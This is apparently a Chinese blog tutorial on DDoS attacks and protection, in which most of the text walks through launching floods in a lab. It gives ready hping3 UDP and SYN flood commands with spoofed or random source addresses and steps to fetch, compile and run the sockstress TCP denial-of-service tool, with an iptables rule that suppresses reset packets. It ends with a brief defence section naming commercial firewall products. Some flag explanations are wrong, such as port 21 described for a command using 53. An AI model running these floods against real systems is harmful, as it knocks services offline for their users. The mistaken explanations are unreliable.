# 原创
：  41-4 DDOS攻击防护实战

# 41-4 DDOS攻击防护实战

### 一、UDP FLOOD攻击

```
# hping3 -q -n -a &lt;攻击IP&gt; -S -s &lt;源端口&gt; --keep -p &lt;目的端口&gt; --flood &lt;被攻击IP&gt;
hping3 --udp -s 6666 -p 53 -a 192.168.1.6 --flood 192.168.1.13
```

这个命令是使用hping3工具进行UDP Flood攻击的命令。下面是各个选项的作用：

#### 演示：

hping3工具kali上有，所以要开启kali虚拟机作为攻击机，然后在开一台windows系统虚拟机作为被攻击机（windows系统查看cpu比较方便，没有windows系统虚拟机的开linux也可以）

##### 1）查看虚拟机ip

```
# windows
ipconfig

# linux
ifconfig

```

##### 2）然后确保两台虚拟机之间可以ping通

```
# windows
ping 目标ip


# linux（-c 4 意思是只发送4个测试包，不指定linux系统是会不断的发送）
ping -c 4 目标ip
```

##### 3）使用kail对windows系统发动 UDP FLOOD 攻击

注意：命令中的ip要改成自己的

```
# 192.168.1.45 是 windows 的ip，53 也是windows系统默认开放的端口
hping3 --udp -s 6666 -p 53 -a 192.168.1.3 --flood 192.168.1.45


# 或者
hping3 -c 100000 -d 65038 -S -w 64 -p 53 --flood --rand-source 192.168.1.45

-c 100000：表示发送100000个TCP SYN数据包，即向目标主机发送大量连接请求。
-d 65038：指定TCP数据包的数据负载为65038字节。这里使用了最大值，以增加攻击流量的大小。
-S：设置TCP SYN标志位，表示向目标主机发起连接请求。
-w 64：指定TCP窗口大小为64，即每发一个数据包之后要等待64个ACK确认信号再继续发送数据包。这样可以使攻击流量更加真实，模拟正常的TCP连接。
-p 21：指定目标端口号为21，即攻击目标的FTP服务端口号。
--flood：表示进行洪水攻击，即不断发送大量的攻击流量。
--rand-source：表示随机选择源IP地址，并且在每次发送数据包时都更换一次源IP地址。
192.168.1.45：指定目标IP地址为192.168.1.45，即攻击的目标。

```

 这里很奇怪，我攻击虚拟机没反应但是我攻击真实机就可以

如果你没安装抓包工具，也可以使用命令行查看

```
netstat -ano
```

该命令将显示系统上当前活动的网络连接和监听的端口号。列出的结果中，Local Address一列显示的是本地IP地址和端口号。 

 <img alt="" height="434" src="https://img-blog.csdnimg.cn/direct/d9efaa2db07c48c9ad2c3a2823fce670.png" width="637"/>

### 二、sockstress 攻击

sOCKSTRESS是一种DDoS攻击工具，它利用TCP连接中的漏洞来占用目标系统的资源，使其无法正常响应请求。以下是使用sOCKSTRESS进行攻击的步骤：

##### 1）下载sockstress脚本：[GitHub - defuse/sockstress: Sockstress (TCP DoS) implementation.](https://github.com/defuse/sockstress)

##### 2）设置防火墙规则，过滤发送给server的REST包，防止server断开连接。

```
# iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 被攻击主机IP -j DROP
iptables -A OUTPUT -p TCP --tcp-flags rst rst -d 192.168.1.45 -j DROP
```

kali攻击机中设置

##### 3）编译sockstress.c文件

```
# 进入到工具文件中
cd sockstress

gcc -Wall -c sockstress.c
gcc -pthread -o sockstress sockstress.o
```

##### 4）运行sockstress脚本，指定目标系统的IP地址和网络接口名称。

```
./sockstress 192.168.1.45:80 eth0
```

##### 5）可以选择使用-p选项指定负载类型，比如使用http负载。

```
./sockstress 192.168.1.45:80 eth0 -p payloads/http
```

### 防御

##### 1、冰盾：[冰盾DDoS防火墙 - 18年专注DDoS防护 防CC攻击 防SYN攻击 防流量攻击 拒绝服务 DDoS防护 冰盾 免费防火墙 (bingdun.com)](https://www.bingdun.com/)

 安装没啥好说的一路下一步就好，最后重启系统就能使用了，不过试用版全功能防护2小时，仅适用于32位的Win2003操作系统，因为我之前攻击Win2003虚拟机也没有成功所以这里没法做攻击演示他的防护，不过这种正版软件防护能力肯定是没问题的，不然他们也没法赚钱。

##### 2）安全狗（推荐，因为这个是免费的，当然企业版也是收费的）

网页安全狗下载：[网站安全狗-网站安全防护,防后门|防SQL注入|防CC攻击|网马查杀|防篡改 (safedog.cn)](https://www.safedog.cn/website_safedog.html)

服务器安全狗：链接：https://pan.baidu.com/s/1LsT0AwVP5DKO7-WJ3zHo0Q?pwd=jwx3 <br/> 提取码：jwx3

**安装** 

安装完成后他会自动对你的apache展开防护
